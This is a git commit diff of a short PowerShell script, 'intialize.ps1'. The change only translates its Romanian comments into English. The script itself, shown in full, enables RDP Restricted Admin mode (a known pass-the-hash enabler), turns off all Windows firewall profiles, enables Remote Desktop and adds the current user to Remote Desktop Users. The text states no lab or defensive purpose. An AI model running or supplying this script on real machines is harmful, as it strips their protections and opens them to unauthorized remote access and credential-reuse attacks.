0fd3e624cfa19c3f15e29d16ba0ab097bfe46ad9
Voltex-XD <96913694+Voltex-XD@users.noreply.github.com>
2025-04-13 18:29:18 +0300

    Update intialize.ps1

--- script1/intialize.ps1
+++ script1/intialize.ps1
@@ -1,11 +1,11 @@
-# Dezactivează "DisableRestrictedAdmin"
+# Disabling "DisableRestrictedAdmin"
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0
 
-# Oprește firewall-ul Windows
+# Stop the firewall
 Set-NetFirewallProfile -Enabled False
 
-# Activează RDP (Remote Desktop Protocol)
+# Activate RDP (Remote Desktop Protocol)
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
 
-# Adaugă utilizatorul curent în grupul "Remote Desktop Users"
+# Add user to RDP "Remote Desktop Users"
 Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:USERNAME
